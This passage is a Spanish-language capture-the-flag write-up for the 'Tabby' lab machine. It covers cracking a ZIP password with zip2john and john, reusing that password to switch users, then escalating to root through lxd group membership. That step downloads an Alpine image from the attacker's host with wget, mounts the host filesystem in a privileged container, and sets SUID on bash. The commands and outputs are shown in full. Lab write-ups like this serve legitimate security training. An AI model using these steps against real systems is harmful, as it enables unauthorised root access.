archivo: Zip archive data, at least v1.0 to extract, compression method=store
❯ mv archivo archivo.zip
❯ unzip archivo.zip
Archive:  archivo.zip
   creating: var/www/html/assets/
[archivo.zip] var/www/html/favicon.ico password: 
```

utilicé la herramienta `zip2john` para extraer el hash de la contraseña del archivo ZIP y guardarlo en un archivo llamado `hash`.
```bash
❯ zip2john archivo.zip > hash
ver 1.0 archivo.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 archivo.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
ver 1.0 archivo.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 archivo.zip/var/www/html/index.php PKZIP Encr: TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6 ts=5935 cs=5935 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** archivo.zip/var/www/html/logo.png PKZIP Encr: TS_chk, cmplen=2906, decmplen=2894, crc=02F9F45F ts=5D46 cs=5d46 type=0
ver 2.0 efh 5455 efh 7875 archivo.zip/var/www/html/news.php PKZIP Encr: TS_chk, cmplen=114, decmplen=123, crc=5C67F19E ts=5A7A cs=5a7a type=8
ver 2.0 efh 5455 efh 7875 archivo.zip/var/www/html/Readme.txt PKZIP Encr: TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3 ts=6A8B cs=6a8b type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Utilizando el hash extraído con `zip2john`, realicé un ataque de fuerza bruta con `john`. la contraseña del archivo ZIP fue revelada como **admin@it**.
```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Warning: invalid UTF-8 seen reading ~/.john/john.pot
No password hashes left to crack (see FAQ)
❯ john --show hash
archivo.zip:admin@it::archivo.zip:var/www/html/news.php, var/www/html/favicon.ico, var/www/html/Readme.txt, var/www/html/logo.png, var/www/html/index.php:archivo.zip

1 password hash cracked, 0 left

```

La contraseña obtenida para el archivo ZIP resultó ser la misma que la del usuario **ash** en el sistema. Utilizando esta contraseña, logré cambiar de usuario con `su ash`, accediendo a su directorio.
```bash
tomcat@tabby:/var/www/html/files$ su ash
Password: admin@it
ash@tabby:/var/www/html/files$ cd
ash@tabby:~$ ls
user.txt
ash@tabby:~$ cat user.txt 
78ac0cb044790f158970adf8b80ec4bc
ash@tabby:~$ 
```

# LXC Exploitation (Privilege Escalation)

Para llevar a cabo la escalación de privilegios, se aprovechó que el usuario **ash** pertenece al grupo **lxd**, lo cual permite la interacción con contenedores de LXC/LXD con privilegios elevados. 
```bash
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Para explotar esta configuración, se clonó el repositorio `lxd-alpine-builder`, el cual permite generar una imagen de Alpine Linux compatible con LXD. Luego, se ejecutó el script `build-alpine`, generando el archivo `alpine-v3.8-x86_64-20250515_2058.tar.gz`, el cual fue utilizado posteriormente para importar y lanzar un contenedor con acceso privilegiado al sistema de archivos del host.
```bash
❯ git clone https://github.com/saghul/lxd-alpine-builder
❯ cd lxd-alpine-builder
❯ ./build-alpine
❯ ls
alpine-v3.8-x86_64-20250515_2058.tar.gz
build-alpine
LICENSE
README.md
```

Con el archivo `.tar.gz` generado, se inició un servidor HTTP. para que pudiera ser descargado desde la máquina víctima.
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la sesión como el usuario `ash`, se descargó el archivo Alpine generado anteriormente usando `wget`:
```bash
ash@tabby:~$ wget http://10.10.16.2/alpine-v3.8-x86_64-20250515_2058.tar.gz
```

Al intentar importar la imagen a LXD con `lxc`, se evidenció que el comando no estaba disponible debido a que la ruta `/snap/bin` no se encontraba incluida en la variable de entorno `PATH`. Para solucionarlo, se actualizó el `PATH`. Una vez corregido, se procedió a importar correctamente la imagen de Alpine a LXD.
```bash
ash@tabby:~$ lxc image import ./alpine-v3.8-x86_64-20250515_2058.tar.gz --alias pwned
Command 'lxc' is available in '/snap/bin/lxc'
The command could not be located because '/snap/bin' is not included in the PATH environment variable.
lxc: command not found
ash@tabby:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
ash@tabby:~$ export PATH=/snap/bin:$PATH
ash@tabby:~$ echo $PATH
/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
ash@tabby:~$ lxc image import ./alpine-v3.8-x86_64-20250515_2058.tar.gz --alias pwned
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

Image imported with fingerprint: fa7c806a145c19764c1d589d4f32a7fd7446df1ba961642bf286b5ec238d5a4d
```

Durante la configuración inicial, se utilizaron todas las opciones por defecto.
```bash
ash@tabby:~$ lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: 
Name of the storage backend to use (dir, lvm, zfs, ceph, btrfs) [default=zfs]: 
Create a new ZFS pool? (yes/no) [default=yes]: 
Would you like to use an existing empty block device (e.g. a disk or partition)? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=5GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like the LXD server to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
```

Una vez inicializado y configurado el entorno LXD, se procedió a crear un contenedor privilegiado con acceso completo al sistema de archivos del host:
```bash
ash@tabby:~$ lxc init pwned mycontainer -c security.privileged=true
Creating mycontainer
```

Luego, se montó el sistema de archivos raíz del host dentro del contenedor:
```bash
ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
```

Después de iniciar el contenedor:
```bash
ash@tabby:~$ lxc start mycontainer
```

Dentro del contenedor, se comprobó que se tenía acceso como **root**, y se navegó hacia el sistema de archivos del host montado en `/mnt/root`.

Se localizó el binario `bash` y se le asignó el bit **SUID**, permitiendo su ejecución con privilegios de root:
```bash
ash@tabby:~$ lxc exec mycontainer /bin/sh
~ # whoami
root
~ # cd /mnt/root/bin
/mnt/root/usr/bin # ls -l bash
-rwxr-xr-x    1 root     root       1183448 Feb 25  2020 bash
/mnt/root/usr/bin # chmod u+s bash
/mnt/root/usr/bin # ls -l bash
-rwsr-xr-x    1 root     root       1183448 Feb 25  2020 bash
/mnt/root/usr/bin # exit
```

Finalmente, se verificó desde el host que el binario `/bin/bash` tenía correctamente asignado el bit SUID:
```bash
ash@tabby:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```

Esto permitió obtener una shell con privilegios de **root** utilizando la opción `-p` de bash:
```bash
ash@tabby:~$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
64a7a938cc5d4d05bbec5dc40b379039
bash-5.0# 
```
